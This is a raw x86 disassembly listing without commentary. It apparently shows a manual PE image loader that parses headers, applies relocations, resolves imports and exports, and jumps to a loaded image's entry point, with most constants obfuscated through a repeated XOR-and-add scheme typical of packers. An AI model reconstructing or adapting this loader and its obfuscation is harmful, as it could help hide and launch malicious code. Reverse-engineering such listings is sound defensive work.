  4211e4:	push   DWORD PTR [ebp+0x1c]
  4211e7:	mov    edx,DWORD PTR [ebp+0x20]
  4211ea:	call   0x42112e
  4211ef:	mov    eax,DWORD PTR [esi]
  4211f1:	mov    ebx,DWORD PTR [esi]
  4211f3:	add    ebx,DWORD PTR [eax+0x3c]
  4211f6:	mov    eax,DWORD PTR [ebp+0xc]
  4211f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4211fc:	mov    ecx,DWORD PTR [ecx]
  4211fe:	mov    esi,0x75108b3
  421203:	xor    eax,esi
  421205:	mov    edi,0x3272fa
  42120a:	add    eax,edi
  42120c:	cmp    eax,ecx
  42120e:	jne    0x421446
  421214:	mov    eax,DWORD PTR [ebp-0xc]
  421217:	mov    eax,DWORD PTR [eax]
  421219:	mov    DWORD PTR [ebp-0x10],eax
  42121c:	mov    eax,DWORD PTR [ebx+0x50]
  42121f:	mov    DWORD PTR [ebp-0x68],eax
  421222:	mov    eax,DWORD PTR [ebp-0x18]
  421225:	xor    eax,esi
  421227:	add    eax,edi
  421229:	mov    DWORD PTR [ebp-0x64],eax
  42122c:	mov    eax,DWORD PTR [ebp-0x14]
  42122f:	and    DWORD PTR [ebp-0x6c],0x0
  421233:	xor    eax,esi
  421235:	add    eax,edi
  421237:	mov    DWORD PTR [ebp-0x60],eax
  42123a:	lea    eax,[ebp-0x70]
  42123d:	push   eax
  42123e:	mov    eax,DWORD PTR [ebp+0x8]
  421241:	xor    eax,esi
  421243:	add    eax,edi
  421245:	push   eax
  421246:	mov    eax,DWORD PTR [ebp+0x20]
  421249:	add    eax,0xaa
  42124e:	push   eax
  42124f:	mov    eax,DWORD PTR [ebp+0x20]
  421252:	mov    eax,DWORD PTR [eax+0x198]
  421258:	mov    DWORD PTR [ebp-0x70],0x4
  42125f:	push   DWORD PTR [eax]
  421261:	mov    eax,DWORD PTR [ebp+0x10]
  421264:	call   eax
  421266:	mov    ecx,DWORD PTR [ebp-0xc]
  421269:	mov    ecx,DWORD PTR [ecx]
  42126b:	mov    edx,DWORD PTR [ebp-0x8]
  42126e:	mov    DWORD PTR [ebp-0x6c],eax
  421271:	mov    DWORD PTR [ebp+0x1c],eax
  421274:	mov    DWORD PTR [edx],ecx
  421276:	mov    ecx,DWORD PTR [ebp-0x4]
  421279:	mov    DWORD PTR [ecx],eax
  42127b:	mov    eax,DWORD PTR [ebx+0x50]
  42127e:	mov    DWORD PTR [ebp-0x68],eax
  421281:	mov    eax,DWORD PTR [ebp-0x1c]
  421284:	xor    eax,esi
  421286:	add    eax,edi
  421288:	mov    DWORD PTR [ebp-0x64],eax
  42128b:	lea    eax,[ebp-0x20]
  42128e:	mov    DWORD PTR [ebp-0x60],eax
  421291:	lea    eax,[ebp-0x70]
  421294:	push   eax
  421295:	mov    eax,DWORD PTR [ebp+0x8]
  421298:	xor    eax,esi
  42129a:	add    eax,edi
  42129c:	push   eax
  42129d:	mov    eax,DWORD PTR [ebp+0x20]
  4212a0:	add    eax,0xee
  4212a5:	push   eax
  4212a6:	mov    eax,DWORD PTR [ebp+0x20]
  4212a9:	mov    eax,DWORD PTR [eax+0x198]
  4212af:	mov    DWORD PTR [ebp-0x70],0x4
  4212b6:	push   DWORD PTR [eax]
  4212b8:	mov    eax,DWORD PTR [ebp+0x10]
  4212bb:	call   eax
  4212bd:	test   eax,eax
  4212bf:	je     0x4212e4
  4212c1:	and    DWORD PTR [ebp+0xc],0x0
  4212c5:	cmp    DWORD PTR [ebx+0x50],0x0
  4212c9:	jbe    0x4212e4
  4212cb:	mov    eax,DWORD PTR [ebp+0x1c]
  4212ce:	mov    ecx,DWORD PTR [ebp-0x10]
  4212d1:	sub    ecx,eax
  4212d3:	mov    dl,BYTE PTR [ecx+eax*1]
  4212d6:	inc    DWORD PTR [ebp+0xc]
  4212d9:	mov    BYTE PTR [eax],dl
  4212db:	mov    edx,DWORD PTR [ebp+0xc]
  4212de:	inc    eax
  4212df:	cmp    edx,DWORD PTR [ebx+0x50]
  4212e2:	jb     0x4212d3
  4212e4:	mov    edx,DWORD PTR [ebp+0x1c]
  4212e7:	mov    ecx,DWORD PTR [edx+0x3c]
  4212ea:	add    ecx,edx
  4212ec:	mov    eax,DWORD PTR [ecx+0xa0]
  4212f2:	mov    ebx,DWORD PTR [ecx+0x28]
  4212f5:	add    eax,edx
  4212f7:	sub    edx,DWORD PTR [ebp-0x10]
  4212fa:	add    ebx,DWORD PTR [ebp+0x1c]
  4212fd:	mov    DWORD PTR [ebp+0xc],edx
  421300:	mov    DWORD PTR [ebp-0x2c],ecx
  421303:	mov    DWORD PTR [ebp-0x14],ebx
  421306:	mov    DWORD PTR [ebp-0x8],0x0
  42130d:	jmp    0x421389
  42130f:	add    edx,0xfffffff8
  421312:	shr    edx,1
  421314:	mov    DWORD PTR [ebp-0x18],edx
  421317:	je     0x421375
  421319:	lea    edx,[eax+0x8]
  42131c:	mov    DWORD PTR [ebp-0x4],edx
  42131f:	mov    edx,DWORD PTR [ebp-0x18]
  421322:	mov    DWORD PTR [ebp-0x18],edx
  421325:	mov    edx,DWORD PTR [ebp-0x4]
  421328:	movzx  edx,WORD PTR [edx]
  42132b:	mov    DWORD PTR [ebp-0x24],edx
  42132e:	and    edx,0xfff
  421334:	mov    DWORD PTR [ebp-0x28],edx
  421337:	mov    edx,DWORD PTR [ebp-0x24]
  42133a:	shr    edx,0xc
  42133d:	add    edx,0xffcd8d06
  421343:	xor    edx,esi
  421345:	cmp    edx,0xf89c85ba
  42134b:	jne    0x42136c
  42134d:	mov    edx,DWORD PTR [ebp-0x28]
  421350:	add    edx,DWORD PTR [ebp+0x1c]
  421353:	mov    ebx,DWORD PTR [eax]
  421355:	cmp    DWORD PTR [ebx+edx*1],0x0
  421359:	je     0x421369
  42135b:	mov    ecx,DWORD PTR [ebp+0xc]
  42135e:	add    ecx,DWORD PTR [ebx+edx*1]
  421361:	mov    ebx,DWORD PTR [eax]
  421363:	mov    DWORD PTR [edx+ebx*1],ecx
  421366:	mov    ecx,DWORD PTR [ebp-0x2c]
  421369:	mov    ebx,DWORD PTR [ebp-0x14]
  42136c:	add    DWORD PTR [ebp-0x4],0x2
  421370:	dec    DWORD PTR [ebp-0x18]
  421373:	jne    0x421325
  421375:	mov    edx,DWORD PTR [ebp-0xc]
  421378:	add    DWORD PTR [ebp-0x8],edx
  42137b:	mov    edx,DWORD PTR [ebp-0x8]
  42137e:	cmp    edx,DWORD PTR [ecx+0xa4]
  421384:	jae    0x421397
  421386:	add    eax,DWORD PTR [ebp-0xc]
  421389:	mov    edx,DWORD PTR [eax+0x4]
  42138c:	mov    DWORD PTR [ebp-0xc],edx
  42138f:	test   edx,edx
  421391:	jne    0x42130f
  421397:	mov    eax,DWORD PTR [ebp-0x10]
  42139a:	mov    DWORD PTR [ebp-0x6c],eax
  42139d:	mov    DWORD PTR [ebp-0x70],0x4
  4213a4:	mov    eax,DWORD PTR [ecx+0x50]
  4213a7:	mov    DWORD PTR [ebp-0x68],eax
  4213aa:	mov    eax,DWORD PTR [ebp-0x1c]
  4213ad:	xor    eax,esi
  4213af:	add    eax,edi
  4213b1:	mov    DWORD PTR [ebp-0x64],eax
  4213b4:	lea    eax,[ebp-0x20]
  4213b7:	mov    DWORD PTR [ebp-0x60],eax
  4213ba:	lea    eax,[ebp-0x70]
  4213bd:	push   eax
  4213be:	mov    eax,DWORD PTR [ebp+0x8]
  4213c1:	xor    eax,esi
  4213c3:	add    eax,edi
  4213c5:	push   eax
  4213c6:	mov    eax,DWORD PTR [ebp+0x20]
  4213c9:	add    eax,0xee
  4213ce:	push   eax
  4213cf:	mov    eax,DWORD PTR [ebp+0x20]
  4213d2:	mov    eax,DWORD PTR [eax+0x198]
  4213d8:	push   DWORD PTR [eax]
  4213da:	mov    eax,DWORD PTR [ebp+0x10]
  4213dd:	call   eax
  4213df:	mov    eax,DWORD PTR [ebp+0x20]
  4213e2:	mov    eax,DWORD PTR [eax+0x180]
  4213e8:	add    eax,DWORD PTR [ebp+0xc]
  4213eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213ee:	push   DWORD PTR [ebp+0x18]
  4213f1:	mov    DWORD PTR [eax],ecx
  4213f3:	push   DWORD PTR [ebp+0x14]
  4213f6:	push   DWORD PTR [ebp+0x1c]
  4213f9:	call   ebx
  4213fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213fe:	add    ecx,DWORD PTR [ebp+0x20]
  421401:	lea    eax,[ebp+0x4]
  421404:	mov    DWORD PTR [ebp+0x20],ecx
  421407:	mov    ecx,DWORD PTR [ebp+0x20]
  42140a:	mov    ecx,DWORD PTR [ebp+0x20]
  42140d:	mov    edx,DWORD PTR [ecx+0x190]
  421413:	mov    ecx,DWORD PTR [ebp+0x20]
  421416:	mov    ecx,DWORD PTR [ecx+0x18c]
  42141c:	mov    esi,DWORD PTR [ecx]
  42141e:	cmp    DWORD PTR [eax],esi
  421420:	jb     0x421441
  421422:	mov    esi,DWORD PTR [edx]
  421424:	mov    edi,DWORD PTR [edx]
  421426:	mov    esi,DWORD PTR [esi+0x3c]
  421429:	lea    esi,[edi+esi*1+0x50]
  42142d:	mov    edi,DWORD PTR [ecx]
  42142f:	add    edi,DWORD PTR [esi]
  421431:	cmp    DWORD PTR [eax],edi
  421433:	jae    0x421441
  421435:	mov    esi,DWORD PTR [ecx]
  421437:	mov    ecx,DWORD PTR [eax]
  421439:	mov    edx,DWORD PTR [edx]
  42143b:	sub    ecx,esi
  42143d:	add    edx,ecx
  42143f:	mov    DWORD PTR [eax],edx
  421441:	mov    eax,DWORD PTR [ebp+0xc]
  421444:	jmp    0x421448
  421446:	xor    eax,eax
  421448:	pop    edi
  421449:	pop    esi
  42144a:	pop    ebx
  42144b:	leave  
  42144c:	ret    0x1c
  42144f:	push   ebp
  421450:	mov    ebp,esp
  421452:	sub    esp,0x1c
  421455:	push   esi
  421456:	mov    esi,eax
  421458:	mov    eax,DWORD PTR [ecx+0x190]
  42145e:	cmp    DWORD PTR [eax],0x0
  421461:	je     0x421571
  421467:	test   edx,edx
  421469:	je     0x421571
  42146f:	test   esi,esi
  421471:	je     0x421571
  421477:	mov    eax,DWORD PTR [esi+0x88]
  42147d:	test   eax,eax
  42147f:	je     0x42156c
  421485:	cmp    DWORD PTR [esi+0x8c],0x10
  42148c:	je     0x42156c
  421492:	cmp    DWORD PTR [esi+0x34],edx
  421495:	je     0x42156c
  42149b:	mov    esi,DWORD PTR [ecx+0x18c]
  4214a1:	and    DWORD PTR [ebp-0x10],0x0
  4214a5:	mov    ecx,edx
  4214a7:	sub    ecx,DWORD PTR [esi]
  4214a9:	add    eax,edx
  4214ab:	movzx  edx,WORD PTR [eax+0xc]
  4214af:	mov    DWORD PTR [ebp-0x1c],ecx
  4214b2:	movzx  ecx,WORD PTR [eax+0xe]
  4214b6:	add    ecx,edx
  4214b8:	je     0x42156c
  4214be:	lea    ecx,[eax+0x14]
  4214c1:	push   ebx
  4214c2:	mov    DWORD PTR [ebp-0x18],ecx
  4214c5:	mov    esi,0x7fffffff
  4214ca:	push   edi
  4214cb:	test   DWORD PTR [ecx],esi
  4214cd:	je     0x42154e
  4214cf:	mov    edx,DWORD PTR [ecx]
  4214d1:	and    DWORD PTR [ebp-0xc],0x0
  4214d5:	and    edx,esi
  4214d7:	add    edx,eax
  4214d9:	movzx  edi,WORD PTR [edx+0xe]
  4214dd:	movzx  ebx,WORD PTR [edx+0xc]
  4214e1:	add    edi,ebx
  4214e3:	je     0x42154e
  4214e5:	lea    ecx,[edx+0x14]
  4214e8:	mov    DWORD PTR [ebp-0x14],ecx
  4214eb:	test   DWORD PTR [ecx],esi
  4214ed:	je     0x421530
  4214ef:	mov    ecx,DWORD PTR [ecx]
  4214f1:	and    DWORD PTR [ebp-0x8],0x0
  4214f5:	and    ecx,esi
  4214f7:	add    ecx,eax
  4214f9:	movzx  edi,WORD PTR [ecx+0xe]
  4214fd:	movzx  ebx,WORD PTR [ecx+0xc]
  421501:	add    edi,ebx
  421503:	je     0x421530
  421505:	lea    edi,[ecx+0x14]
  421508:	mov    DWORD PTR [ebp-0x4],edi
  42150b:	mov    edi,DWORD PTR [ebp-0x4]
  42150e:	mov    edi,DWORD PTR [edi]
  421510:	test   edi,edi
  421512:	je     0x42151a
  421514:	mov    ebx,DWORD PTR [ebp-0x1c]
  421517:	add    DWORD PTR [edi+eax*1],ebx
  42151a:	movzx  edi,WORD PTR [ecx+0xe]
  42151e:	movzx  ebx,WORD PTR [ecx+0xc]
  421522:	inc    DWORD PTR [ebp-0x8]
  421525:	add    DWORD PTR [ebp-0x4],0x8
  421529:	add    edi,ebx
  42152b:	cmp    DWORD PTR [ebp-0x8],edi
  42152e:	jb     0x42150b
  421530:	movzx  edi,WORD PTR [edx+0xe]
  421534:	movzx  ebx,WORD PTR [edx+0xc]
  421538:	mov    ecx,DWORD PTR [ebp-0x14]
  42153b:	inc    DWORD PTR [ebp-0xc]
  42153e:	add    ecx,0x8
  421541:	add    edi,ebx
  421543:	mov    DWORD PTR [ebp-0x14],ecx
  421546:	cmp    DWORD PTR [ebp-0xc],edi
  421549:	jb     0x4214eb
  42154b:	mov    ecx,DWORD PTR [ebp-0x18]
  42154e:	movzx  edx,WORD PTR [eax+0xe]
  421552:	movzx  edi,WORD PTR [eax+0xc]
  421556:	inc    DWORD PTR [ebp-0x10]
  421559:	add    ecx,0x8
  42155c:	add    edx,edi
  42155e:	mov    DWORD PTR [ebp-0x18],ecx
  421561:	cmp    DWORD PTR [ebp-0x10],edx
  421564:	jb     0x4214cb
  42156a:	pop    edi
  42156b:	pop    ebx
  42156c:	xor    eax,eax
  42156e:	inc    eax
  42156f:	jmp    0x421573
  421571:	xor    eax,eax
  421573:	pop    esi
  421574:	leave  
  421575:	ret    
  421576:	push   ebp
  421577:	mov    ebp,esp
  421579:	mov    ecx,DWORD PTR [ecx+0x190]
  42157f:	mov    eax,DWORD PTR [ebp+0xc]
  421582:	sub    esp,0x10
  421585:	push   ebx
  421586:	xor    ebx,ebx
  421588:	push   esi
  421589:	push   edi
  42158a:	cmp    DWORD PTR [ecx],ebx
  42158c:	je     0x421614
  421592:	cmp    eax,ebx
  421594:	je     0x421614
  421596:	cmp    DWORD PTR [eax+0x78],ebx
  421599:	jne    0x4215a0
  42159b:	xor    eax,eax
  42159d:	inc    eax
  42159e:	jmp    0x421616
  4215a0:	mov    eax,DWORD PTR [eax+0x78]
  4215a3:	add    eax,DWORD PTR [ebp+0x8]
  4215a6:	mov    ecx,DWORD PTR [eax+0x1c]
  4215a9:	mov    edx,DWORD PTR [eax+0x24]
  4215ac:	mov    esi,DWORD PTR [eax+0x14]
  4215af:	mov    edi,DWORD PTR [eax+0x18]
  4215b2:	add    ecx,DWORD PTR [ebp+0x8]
  4215b5:	add    edx,DWORD PTR [ebp+0x8]
  4215b8:	mov    DWORD PTR [ebp-0x4],esi
  4215bb:	cmp    esi,edi
  4215bd:	ja     0x4215c2
  4215bf:	mov    DWORD PTR [ebp-0x4],edi
  4215c2:	mov    DWORD PTR [ebp-0x8],ebx
  4215c5:	cmp    DWORD PTR [ebp-0x4],ebx
  4215c8:	jbe    0x42159b
  4215ca:	cmp    ebx,DWORD PTR [eax+0x14]
  4215cd:	jae    0x4215d5
  4215cf:	movzx  esi,WORD PTR [edx+ebx*2]
  4215d3:	jmp    0x4215d7
  4215d5:	mov    esi,ebx
  4215d7:	lea    esi,[ecx+esi*4]
  4215da:	mov    edi,DWORD PTR [esi]
  4215dc:	test   edi,edi
  4215de:	je     0x421609
  4215e0:	add    edi,DWORD PTR [ebp+0x8]
  4215e3:	mov    DWORD PTR [ebp-0x10],edi
  4215e6:	cmp    edi,eax
  4215e8:	jbe    0x4215fa
  4215ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4215ed:	mov    ebx,DWORD PTR [ebx+0x7c]
  4215f0:	add    ebx,eax
  4215f2:	cmp    edi,ebx
  4215f4:	jae    0x4215fa
  4215f6:	mov    esi,DWORD PTR [esi]
  4215f8:	jmp    0x421602
  4215fa:	sub    edi,DWORD PTR [ebp+0x8]
  4215fd:	mov    DWORD PTR [esi],edi
  4215ff:	mov    esi,DWORD PTR [ebp-0x10]
  421602:	test   esi,esi
  421604:	je     0x421614
  421606:	mov    ebx,DWORD PTR [ebp-0x8]
  421609:	inc    ebx
  42160a:	mov    DWORD PTR [ebp-0x8],ebx
  42160d:	cmp    ebx,DWORD PTR [ebp-0x4]
  421610:	jb     0x4215ca
  421612:	jmp    0x42159b
  421614:	xor    eax,eax
  421616:	pop    edi
  421617:	pop    esi
  421618:	pop    ebx
  421619:	leave  
  42161a:	ret    0x8
  42161d:	push   ebp
  42161e:	mov    ebp,esp
  421620:	sub    esp,0x2c
  421623:	mov    edx,0xf89c85b5
  421628:	mov    DWORD PTR [ebp-0x4],edx
  42162b:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  421632:	mov    eax,DWORD PTR [ebp-0x4]
  421635:	mov    ecx,DWORD PTR [ebp-0x4]
  421638:	mov    ecx,DWORD PTR [ebp-0x4]
  42163b:	mov    ecx,DWORD PTR [ebp-0x4]
  42163e:	mov    ecx,DWORD PTR [ebp-0x4]
  421641:	mov    ecx,DWORD PTR [ebp-0x4]
  421644:	push   ebx
  421645:	mov    ebx,DWORD PTR [ebp+0x10]
  421648:	push   esi
  421649:	mov    esi,0x75108b3
  42164e:	mov    DWORD PTR [ebp-0x10],0x352ebcf
  421655:	mov    ecx,DWORD PTR [ebp-0x4]
  421658:	mov    ebx,DWORD PTR [ebx+0x190]
  42165e:	push   edi
  42165f:	mov    edi,0x3272fa
  421664:	xor    ecx,esi
  421666:	xor    eax,esi
  421668:	add    eax,edi
  42166a:	add    ecx,edi
  42166c:	mov    DWORD PTR [ebp-0x18],eax
  42166f:	cmp    ecx,DWORD PTR [ebx]
  421671:	je     0x4218f2
  421677:	mov    ebx,DWORD PTR [ebp-0x4]
  42167a:	mov    ecx,DWORD PTR [ebp+0xc]
  42167d:	xor    ebx,esi
  42167f:	add    ebx,edi
  421681:	cmp    ebx,ecx
  421683:	je     0x4218f2
  421689:	mov    ebx,DWORD PTR [ebp-0x4]
  42168c:	mov    ecx,DWORD PTR [ecx+0x80]
  421692:	xor    ebx,esi
  421694:	add    ebx,edi
  421696:	cmp    ecx,ebx
  421698:	je     0x4218ed
  42169e:	add    ecx,DWORD PTR [ebp+0x8]
  4216a1:	mov    DWORD PTR [ebp-0x2c],ecx
  4216a4:	mov    ebx,edx
  4216a6:	xor    ebx,esi
  4216a8:	add    ebx,edi
  4216aa:	mov    DWORD PTR [ebp-0x10],ebx
  4216ad:	mov    ebx,DWORD PTR [ebp-0x10]
  4216b0:	cmp    ebx,edx
  4216b2:	je     0x4216c6
  4216b4:	mov    edx,DWORD PTR [ebp-0x10]
  4216b7:	mov    ebx,DWORD PTR [ebp-0x4]
  4216ba:	imul   edx,edx,0x14
  4216bd:	xor    ebx,esi
  4216bf:	add    ebx,edi
  4216c1:	cmp    DWORD PTR [edx+ecx*1],ebx
  4216c4:	jne    0x4216dd
  4216c6:	mov    edx,DWORD PTR [ebp-0x10]
  4216c9:	mov    ebx,DWORD PTR [ebp-0x4]
  4216cc:	imul   edx,edx,0x14
  4216cf:	xor    ebx,esi
  4216d1:	add    ebx,edi
  4216d3:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  4216d7:	je     0x4218df
  4216dd:	mov    eax,DWORD PTR [ebp-0x4]
  4216e0:	mov    ebx,DWORD PTR [ebp-0x4]
  4216e3:	mov    eax,DWORD PTR [ebp-0x10]
  4216e6:	imul   eax,eax,0x14
  4216e9:	add    eax,ecx
  4216eb:	mov    ecx,DWORD PTR [eax+0x10]
  4216ee:	add    ecx,DWORD PTR [ebp+0x8]
  4216f1:	xor    ebx,esi
  4216f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4216f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4216f9:	mov    edx,DWORD PTR [ebp-0x4]
  4216fc:	xor    ecx,esi
  4216fe:	add    ecx,edi
  421700:	xor    edx,esi
  421702:	mov    DWORD PTR [ebp-0x24],ecx
  421705:	mov    ecx,DWORD PTR [eax]
  421707:	add    edx,edi
  421709:	add    ebx,edi
  42170b:	cmp    ecx,edx
  42170d:	je     0x421715
  42170f:	add    ecx,DWORD PTR [ebp+0x8]
  421712:	mov    DWORD PTR [ebp-0x24],ecx
  421715:	mov    ecx,DWORD PTR [ebp-0x4]
  421718:	xor    ecx,esi
  42171a:	add    ecx,DWORD PTR [eax+0xc]
  42171d:	mov    eax,DWORD PTR [ebp+0x8]
  421720:	lea    eax,[ecx+eax*1+0x3272fa]
  421727:	mov    DWORD PTR [ebp+0xc],eax
  42172a:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  421731:	mov    eax,DWORD PTR [ebp+0x10]
  421734:	push   DWORD PTR [ebp+0xc]
  421737:	mov    eax,DWORD PTR [eax+0x1e0]
  42173d:	call   DWORD PTR [eax]
  42173f:	mov    ecx,DWORD PTR [ebp-0x4]
  421742:	xor    ecx,esi
  421744:	add    ecx,edi
  421746:	mov    DWORD PTR [ebp-0xc],eax
  421749:	cmp    ecx,eax
  42174b:	jne    0x42175f
  42174d:	mov    eax,DWORD PTR [ebp+0x10]
  421750:	push   DWORD PTR [ebp+0xc]
  421753:	mov    eax,DWORD PTR [eax+0x1e0]
  421759:	call   DWORD PTR [eax+0xc]
  42175c:	mov    DWORD PTR [ebp-0xc],eax
  42175f:	mov    DWORD PTR [ebp-0x20],0x7f661bcc
  421766:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  42176d:	mov    eax,DWORD PTR [ebp-0x4]
  421770:	xor    eax,esi
  421772:	add    eax,edi
  421774:	cmp    eax,DWORD PTR [ebp-0xc]
  421777:	jne    0x42179c
  421779:	mov    eax,DWORD PTR [ebp-0x8]
  42177c:	mov    ecx,DWORD PTR [ebp-0x20]
  42177f:	xor    eax,esi
  421781:	xor    ecx,esi
  421783:	lea    ebx,[ebx+eax*1+0x3272fa]
  42178a:	mov    eax,DWORD PTR [ebp+0x10]
  42178d:	mov    eax,DWORD PTR [eax+0x1e0]
  421793:	add    ecx,edi
  421795:	imul   ecx,ebx
  421798:	push   ecx
  421799:	call   DWORD PTR [eax+0x24]
  42179c:	mov    eax,DWORD PTR [ebp-0x4]
  42179f:	xor    eax,esi
  4217a1:	add    eax,edi
  4217a3:	cmp    eax,DWORD PTR [ebp-0xc]
  4217a6:	jne    0x4217b7
  4217a8:	mov    eax,DWORD PTR [ebp-0x28]
  4217ab:	xor    eax,esi
  4217ad:	add    eax,edi
  4217af:	cmp    ebx,eax
  4217b1:	jbe    0x421731
  4217b7:	mov    eax,DWORD PTR [ebp-0x4]
  4217ba:	xor    eax,esi
  4217bc:	add    eax,edi
  4217be:	cmp    eax,DWORD PTR [ebp-0xc]
  4217c1:	jne    0x4217da
  4217c3:	mov    eax,DWORD PTR [ebp-0x8]
  4217c6:	mov    ecx,DWORD PTR [ebp-0x18]
  4217c9:	xor    eax,esi
  4217cb:	lea    eax,[ecx+eax*1+0x3272fa]
  4217d2:	mov    DWORD PTR [ebp-0x18],eax
  4217d5:	jmp    0x4218c9
  4217da:	mov    DWORD PTR [ebp-0x14],0x1121bcd
  4217e1:	mov    DWORD PTR [ebp+0xc],0xe042dcf
  4217e8:	mov    ebx,DWORD PTR [ebp-0x4]
  4217eb:	xor    ebx,esi
  4217ed:	add    ebx,edi
  4217ef:	jmp    0x4218b6
  4217f4:	mov    eax,DWORD PTR [ebp-0x4]
  4217f7:	xor    eax,esi
  4217f9:	add    eax,edi
  4217fb:	mov    DWORD PTR [ebp-0x14],eax
  4217fe:	mov    eax,DWORD PTR [ebp-0x4]
  421801:	xor    eax,esi
  421803:	add    eax,edi
  421805:	mov    DWORD PTR [ebp+0xc],eax
  421808:	mov    ecx,DWORD PTR [ebp-0x4]
  42180b:	mov    eax,DWORD PTR [ebp-0x24]
  42180e:	xor    ecx,esi
  421810:	add    ecx,edi
  421812:	cmp    ecx,eax
  421814:	je     0x42181c
  421816:	mov    eax,DWORD PTR [eax+ebx*4]
  421819:	mov    DWORD PTR [ebp-0x14],eax
  42181c:	mov    eax,DWORD PTR [ebp-0x1c]
  42181f:	mov    eax,DWORD PTR [eax+ebx*4]
  421822:	mov    DWORD PTR [ebp+0xc],eax
  421825:	mov    eax,DWORD PTR [ebp-0x4]
  421828:	mov    ecx,DWORD PTR [ebp-0x14]
  42182b:	xor    eax,esi
  42182d:	add    eax,edi
  42182f:	cmp    eax,ecx
  421831:	je     0x42185c
  421833:	mov    eax,DWORD PTR [ebp-0x4]
  421836:	mov    ecx,DWORD PTR [ebp-0x14]
  421839:	xor    eax,esi
  42183b:	add    eax,edi
  42183d:	shr    ecx,0x1f
  421840:	cmp    eax,ecx
  421842:	je     0x42185c
  421844:	mov    ecx,DWORD PTR [ebp-0x14]
  421847:	mov    eax,DWORD PTR [ebp+0x10]
  42184a:	mov    eax,DWORD PTR [eax+0x1e0]
  421850:	movzx  ecx,cx
  421853:	push   ecx
  421854:	push   DWORD PTR [ebp-0xc]
  421857:	call   DWORD PTR [eax+0x8]
  42185a:	jmp    0x421875
  42185c:	mov    eax,DWORD PTR [ebp+0xc]
  42185f:	add    eax,DWORD PTR [ebp+0x8]
  421862:	mov    ecx,DWORD PTR [ebp+0x10]
  421865:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42186b:	add    eax,0x2
  42186e:	push   eax
  42186f:	push   DWORD PTR [ebp-0xc]
  421872:	call   DWORD PTR [ecx+0x8]
  421875:	mov    DWORD PTR [ebp+0xc],eax
  421878:	mov    eax,DWORD PTR [ebp-0x4]
  42187b:	mov    ecx,DWORD PTR [ebp+0xc]
  42187e:	xor    eax,esi
  421880:	add    eax,edi
  421882:	cmp    eax,ecx
  421884:	mov    eax,DWORD PTR [ebp-0x8]
  421887:	jne    0x42189a
  421889:	mov    ecx,DWORD PTR [ebp-0x18]
  42188c:	xor    eax,esi
  42188e:	lea    eax,[ecx+eax*1+0x3272fa]
  421895:	mov    DWORD PTR [ebp-0x18],eax
  421898:	jmp    0x4218aa
  42189a:	mov    ecx,DWORD PTR [ebp+0xc]
  42189d:	xor    eax,esi
  42189f:	add    eax,edi
  4218a1:	imul   eax,ecx
  4218a4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218a7:	mov    DWORD PTR [ecx+ebx*4],eax
  4218aa:	mov    eax,DWORD PTR [ebp-0x8]
  4218ad:	xor    eax,esi
  4218af:	lea    ebx,[ebx+eax*1+0x3272fa]
  4218b6:	mov    eax,DWORD PTR [ebp-0x4]
  4218b9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218bc:	xor    eax,esi
  4218be:	add    eax,edi
  4218c0:	cmp    DWORD PTR [ecx+ebx*4],eax
  4218c3:	jne    0x4217f4
  4218c9:	mov    edx,DWORD PTR [ebp-0x10]
  4218cc:	mov    eax,DWORD PTR [ebp-0x18]
  4218cf:	mov    ecx,DWORD PTR [ebp-0x2c]
  4218d2:	sub    edx,0x3272f9
  4218d8:	xor    edx,esi
  4218da:	jmp    0x4216a4
  4218df:	mov    ecx,DWORD PTR [ebp-0x4]
  4218e2:	xor    ecx,esi
  4218e4:	add    ecx,edi
  4218e6:	cmp    eax,ecx
  4218e8:	mov    eax,DWORD PTR [ebp-0x4]
  4218eb:	jne    0x4218f5
  4218ed:	mov    eax,DWORD PTR [ebp-0x8]
  4218f0:	jmp    0x4218f5
  4218f2:	mov    eax,DWORD PTR [ebp-0x4]
  4218f5:	xor    eax,esi
  4218f7:	add    eax,edi
  4218f9:	pop    edi
  4218fa:	pop    esi
  4218fb:	pop    ebx
  4218fc:	leave  
  4218fd:	ret    0xc
  421900:	push   ebp
  421901:	mov    ebp,esp
  421903:	sub    esp,0x28
  421906:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42190d:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  421914:	mov    eax,DWORD PTR [ebp+0xc]
  421917:	mov    DWORD PTR [ebp+0xc],eax
  42191a:	push   esi
  42191b:	mov    eax,eax
  42191d:	mov    eax,DWORD PTR [ebp-0x4]
  421920:	mov    esi,DWORD PTR [ebp+0x8]
  421923:	mov    ecx,0x75108b3
  421928:	xor    eax,ecx
  42192a:	mov    edx,0x3272fa
  42192f:	add    eax,edx
  421931:	cmp    esi,eax
  421933:	je     0x421a5a
  421939:	mov    eax,DWORD PTR [ebp+0x8]
  42193c:	mov    esi,DWORD PTR [ebp+0x8]
  42193f:	add    esi,DWORD PTR [eax+0x3c]
  421942:	push   edi
  421943:	mov    DWORD PTR [ebp+0xc],esi
  421946:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  42194d:	mov    eax,DWORD PTR [ebp-0x1c]
  421950:	mov    esi,DWORD PTR [ebp-0x4]
  421953:	mov    edi,DWORD PTR [ebp+0xc]
  421956:	xor    esi,ecx
  421958:	xor    eax,ecx
  42195a:	add    esi,edx
  42195c:	cmp    DWORD PTR [edi+eax*8+0x1939848],esi
  421963:	je     0x421a54
  421969:	mov    esi,DWORD PTR [ebp+0xc]
  42196c:	mov    eax,DWORD PTR [ebp+0x8]
  42196f:	add    eax,DWORD PTR [esi+0xa0]
  421975:	mov    esi,DWORD PTR [ebp+0x8]
  421978:	mov    edi,DWORD PTR [ebp+0xc]
  42197b:	sub    esi,DWORD PTR [edi+0x34]
  42197e:	mov    edi,DWORD PTR [ebp-0x4]
  421981:	xor    edi,ecx
  421983:	add    edi,edx
  421985:	mov    DWORD PTR [ebp-0x24],esi
  421988:	cmp    esi,edi
  42198a:	je     0x421a54
  421990:	mov    esi,DWORD PTR [ebp-0x4]
